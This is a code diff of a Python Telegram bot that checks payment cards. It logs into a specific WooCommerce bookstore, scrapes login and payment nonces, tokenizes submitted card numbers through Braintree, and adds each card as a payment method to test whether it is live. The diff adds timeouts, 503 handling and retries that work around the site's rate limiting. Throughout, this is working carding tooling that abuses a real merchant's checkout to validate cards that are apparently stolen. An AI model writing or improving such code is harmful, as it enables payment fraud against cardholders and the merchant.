@@ -125,10 +125,22 @@ def bt_h(fp):
     }
 
 def login():
-    """Improved login with strict validation"""
+    """Improved login with retry logic and proper status code handling"""
     try:
         s = requests.Session()
-        r = s.get('https://livresq.com/en/my-account/', headers=h1())
+        
+        # Step 1: Get login page
+        print("📍 Step 1: Fetching login page...")
+        r = s.get('https://livresq.com/en/my-account/', headers=h1(), timeout=10)
+        print(f"   Status: {r.status_code}")
+        
+        if r.status_code == 503:
+            print("⚠️  SERVER UNAVAILABLE (503) - Website is temporarily down. Try again later.")
+            return None
+        
+        if r.status_code != 200:
+            print(f"❌ Failed to get login page. Status: {r.status_code}")
+            return None
         
         # Extract nonce
         n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
@@ -138,6 +150,8 @@ def login():
         
         print("✅ Login Nonce found")
         
+        # Step 2: Submit login credentials
+        print("📍 Step 2: Submitting login credentials...")
         d = {
             'username': EMAIL,
             'password': PASSWORD,
@@ -147,40 +161,50 @@ def login():
             'trp-form-language': 'en'
         }
         
-        r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d)
-        print(f"Response Status: {r.status_code}")
+        r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d, timeout=10)
+        print(f"   Status: {r.status_code}")
         
-        # Check for explicit error messages (most reliable)
+        # Handle 503 error
+        if r.status_code == 503:
+            print("⚠️  SERVER UNAVAILABLE (503) - Website is temporarily down. Try again later.")
+            return None
+        
+        if r.status_code != 200:
+            print(f"❌ Login POST failed. Status: {r.status_code}")
+            return None
+        
+        # Check for explicit error messages
         if 'woocommerce-error' in r.text:
             print("❌ LOGIN ERROR: WooCommerce error detected")
             error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
             if error_match:
                 error_msg = re.sub(r'<[^>]+>', '', error_match.group(1).strip())
-                print(f"Error message: {error_msg}")
+                print(f"   Error: {error_msg}")
             return None
         
-        # Check if session was created (better indicator)
-        # Check for logout button in proper context
-        logout_pattern = r'<a[^>]*href="[^"]*logout[^"]*"[^>]*>.*?Log\s*Out|Logout'
-        if re.search(logout_pattern, r.text, re.IGNORECASE):
+        # Verify login success
+        print("📍 Step 3: Verifying login...")
+        
+        # Check for logout button
+        if re.search(r'<a[^>]*href="[^"]*logout[^"]*"[^>]*>.*?Log\s*Out|Logout', r.text, re.IGNORECASE):
             print("✅ LOGIN SUCCESSFUL - Logout button found!")
             return s
         
-        # Check for redirect to login page (indicates failed login)
-        if 'woocommerce-login-nonce' in r.text and r.url != 'https://livresq.com/en/my-account/':
-            print("❌ LOGIN ERROR: Redirected back to login page")
-            return None
-        
-        # Check if we got the account page (check for account-specific elements)
+        # Check for account navigation
         if 'woocommerce-MyAccount-navigation' in r.text or 'customer-logout' in r.text:
             print("✅ LOGIN SUCCESSFUL - Account page detected!")
             return s
         
         print("❌ LOGIN ERROR: Could not verify login status")
-        print("Response status code:", r.status_code)
-        print("Response URL:", r.url)
+        print(f"   URL after login: {r.url}")
         return None
             
+    except requests.exceptions.Timeout:
+        print("❌ LOGIN ERROR: Request timeout - server not responding")
+        return None
+    except requests.exceptions.ConnectionError:
+        print("❌ LOGIN ERROR: Connection failed - check internet connection")
+        return None
     except Exception as e:
         print(f"❌ LOGIN ERROR: {str(e)}")
         return None
@@ -188,14 +212,23 @@ def login():
 def get_nonces(s):
     """Extract nonces from add payment method page"""
     try:
-        r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3())
+        print("📍 Fetching nonces...")
+        r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3(), timeout=10)
+        
+        if r.status_code == 503:
+            print("⚠️  SERVER UNAVAILABLE (503)")
+            return None, None
+        
+        if r.status_code != 200:
+            print(f"❌ Failed to get nonces page. Status: {r.status_code}")
+            return None, None
         
         # Extract add payment method nonce
         an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
         if an:
-            print("✅ Add Nonce found")
+            print("   ✅ Add Nonce found")
         else:
-            print("❌ Add Nonce NOT FOUND")
+            print("   ❌ Add Nonce NOT FOUND")
         
         # Extract client token nonce
         cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
@@ -203,15 +236,17 @@ def get_nonces(s):
             cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
         
         if cn:
-            print("✅ Client Nonce found")
+            print("   ✅ Client Nonce found")
         else:
-            print("❌ Client Nonce NOT FOUND")
+            print("   ❌ Client Nonce NOT FOUND")
         
         if not an or not cn:
-            print("DEBUG: Could not extract both nonces, response length:", len(r.text))
             return None, None
         
         return an.group(1), cn.group(1)
+    except requests.exceptions.Timeout:
+        print("❌ ERROR in get_nonces: Request timeout")
+        return None, None
     except Exception as e:
         print(f"❌ ERROR in get_nonces: {str(e)}")
         return None, None
@@ -223,8 +258,13 @@ def get_fp(s, cn):
         return None
     
     try:
+        print("📍 Getting fingerprint...")
         d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
-        r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d)
+        r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d, timeout=10)
+        
+        if r.status_code == 503:
+            print("⚠️  SERVER UNAVAILABLE (503)")
+            return None
         
         if r.status_code != 200:
             print(f"❌ ERROR: Status code {r.status_code}")
@@ -233,19 +273,21 @@ def get_fp(s, cn):
         j = r.json()
         if 'data' not in j:
             print("❌ ERROR: No 'data' field in response")
-            print("Response:", j)
             return None
         
         dt = base64.b64decode(j['data']).decode('utf-8')
         fp = json.loads(dt).get('authorizationFingerprint')
         
         if fp:
-            print("✅ Fingerprint obtained successfully")
+            print("   ✅ Fingerprint obtained")
             return fp
         else:
             print("❌ ERROR: Could not extract fingerprint")
             return None
             
+    except requests.exceptions.Timeout:
+        print("❌ ERROR in get_fp: Request timeout")
+        return None
     except Exception as e:
         print(f"❌ ERROR in get_fp: {str(e)}")
         return None
@@ -253,6 +295,7 @@ def get_fp(s, cn):
 async def tok(fp, cc, mm, yy, cv):
     """Tokenize credit card via Braintree GraphQL"""
     try:
+        print("📍 Tokenizing card...")
         async with aiohttp.ClientSession() as ses:
             sid = str(uuid.uuid4())
             q = {
@@ -270,30 +313,33 @@ async def tok(fp, cc, mm, yy, cv):
                 },
                 'operationName': 'TokenizeCreditCard'
             }
-            async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q) as resp:
+            async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                 if resp.status != 200:
-                    print(f"❌ ERROR: Braintree status code {resp.status}")
+                    print(f"   ❌ ERROR: Braintree status code {resp.status}")
                     return None
                 
                 res = await resp.json()
                 token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
                 
                 if token:
-                    print("✅ Token generated successfully")
+                    print("   ✅ Token generated")
                     return token
                 else:
-                    print("❌ ERROR: Could not generate token")
-                    print("Response:", res)
+                    print("   ❌ ERROR: Could not generate token")
                     return None
                     
+    except asyncio.TimeoutError:
+        print("   ❌ ERROR in tok: Request timeout")
+        return None
     except Exception as e:
-        print(f"❌ ERROR in tok: {str(e)}")
+        print(f"   ❌ ERROR in tok: {str(e)}")
         return None
 
 def add_pm(s, pt, an):
     """Add payment method to account"""
     for attempt in range(4):
         try:
+            print(f"📍 Adding payment method (attempt {attempt + 1}/4)...")
             pd = {
                 'payment_method': 'braintree_credit_card',
                 'wc-braintree-credit-card-card-type': 'visa',
@@ -308,11 +354,16 @@ def add_pm(s, pt, an):
                 'woocommerce_add_payment_method': '1',
                 'trp-form-language': 'en'
             }
-            r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd)
+            r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd, timeout=10)
+            
+            if r.status_code == 503:
+                print("   ⚠️  SERVER UNAVAILABLE (503) - Waiting 15s...")
+                time.sleep(15)
+                continue
             
             # Rate limiting check
             if 'You cannot add a new payment method so soon' in r.text:
-                print(f"⏱️ Rate limited, waiting 15s (attempt {attempt + 1}/4)")
+                print(f"   ⏱️  Rate limited - Waiting 15s...")
                 time.sleep(15)
                 continue
             
@@ -321,12 +372,12 @@ def add_pm(s, pt, an):
             if em:
                 et = re.sub(r'\s+', ' ', em.group(1).strip())
                 et = re.sub(r'&nbsp;', ' ', et)
-                print(f"❌ Card Error: {et}")
+                print(f"   ❌ Card Error: {et}")
                 return False, et
             
             # Success check
             if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
-                print("✅ CARD APPROVED")
+                print("   ✅ CARD APPROVED")
                 return True, "APPROVED"
             
             # Message check
@@ -334,22 +385,26 @@ def add_pm(s, pt, an):
             if sm:
                 st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
                 st = re.sub(r'\s+', ' ', st)
-                print(f"✅ Card Response: {st}")
+                print(f"   ✅ Card Response: {st}")
                 return True, st
             
             # Wait before retry
             if attempt < 3:
+                print("   ⏱️  Waiting 15s before retry...")
                 time.sleep(15)
                 
+        except requests.exceptions.Timeout:
+            print(f"   ⚠️  Request timeout - Waiting 15s...")
+            time.sleep(15)
         except Exception as e:
-            print(f"❌ ERROR in add_pm: {str(e)}")
+            print(f"   ❌ ERROR in add_pm: {str(e)}")
     
-    print("❌ Unknown error after retries")
+    print("   ❌ Unknown error after retries")
     return False, "UNKNOWN"
 
 async def proc(s, cc, mm, yy, cv):
     """Main processing function"""
-    print("\n--- Starting Card Processing ---")
+    print("\n--- 🎯 Starting Card Processing ---")
     
     an, cn = get_nonces(s)
     if not an or not cn:
@@ -389,7 +444,7 @@ async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("All fields must be numeric.")
         return
 
-    await update.message.reply_text("Processing card... (this may take 30-60s)")
+    await update.message.reply_text("⏳ Processing card... (this may take 30-60s)")
 
     try:
         s = login()
@@ -409,7 +464,7 @@ async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("check", check_card))
-    print("Bot is running...")
+    print("🤖 Bot is running... Press Ctrl+C to stop")
     app.run_polling()
 
 if __name__ == "__main__":
